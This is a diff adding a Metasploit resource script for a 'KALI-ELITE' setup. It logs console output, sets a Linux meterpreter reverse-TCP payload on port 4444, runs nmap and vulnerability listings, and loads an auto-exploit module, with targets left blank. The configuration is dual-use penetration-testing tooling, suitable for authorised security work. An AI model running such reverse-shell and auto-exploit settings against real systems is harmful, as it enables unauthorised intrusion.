@@ -1,0 +1,31 @@
+# KALI-ELITE - Metasploit Resource Script
+# Load with: msfconsole -q -r metasploit.rc
+
+# Setup
+spool /root/kali-elite/reports/msf_console.log
+banner
+
+# Common settings
+setg VERBOSE true
+setg RHOSTS
+setg RPORT
+
+# Payloads
+setg PAYLOAD linux/x64/meterpreter/reverse_tcp
+setg LHOST
+setg LPORT 4444
+
+# Auto-exploit
+db_status
+db_nmap
+hosts
+services
+vulns
+
+# Load modules
+load alias
+load autoexploit
+
+# Prompt
+prompt %cya%T %red■ %blu%S %grn■ %whtSession %red%L %blk@ %red%s
+promptchar >
